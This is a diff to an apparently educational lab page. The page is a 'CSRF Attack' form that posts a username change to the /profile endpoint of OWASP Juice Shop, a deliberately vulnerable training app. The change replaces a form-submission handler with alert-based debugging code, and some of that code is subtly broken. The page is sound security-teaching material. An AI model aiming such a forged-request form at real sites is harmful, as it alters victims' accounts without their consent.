@@ -56,6 +56,16 @@ data:
     <html>
     <head><title>CSRF Attack</title></head>
     
+    <script language="JavaScript">
+        let attackForm = document.forms["hackingform"];
+        let urlField = attackForm.elements["urlField"]
+        
+        function submitForm() {
+            alert("urlField: " + urlField);
+            alert("url: " + urlField.text);
+        }
+    </script>
+    
     <body>
     
     <h2>Juiceshop Username Hacking Form</h2>
@@ -77,23 +87,8 @@ data:
          method="POST">
         URL:<input id="juiceshopUrl" name="url" type="text" value="" /><br>
      Username:<input name="username" type="text" value="hacked" />
-     <input type="submit" value="Hack Username" />
+     <input type="submit" value="Hack Username" onClick="submitForm()" />
     </form>
-
-    <script>
-        let juiceshopUrlField = document.getElementById("juiceshopUrl");
-        let url = juiceshopUrlField.text;
-        hackingform.addEventListener("submit", (e) => {
-          e.preventDefault();
-          alert("url 1: " + url);
-          url = url.replace("#", "%.23")
-          alert("url 2: " + url);
-          hackingform.action = url + '/profile';
-          // handle submit
-          alert("action: " + hackingForm.action);
-          hackingform.submit();
-        });
-    </script>
     
     <h3>CSRF Protection</h3>
     <p></p>
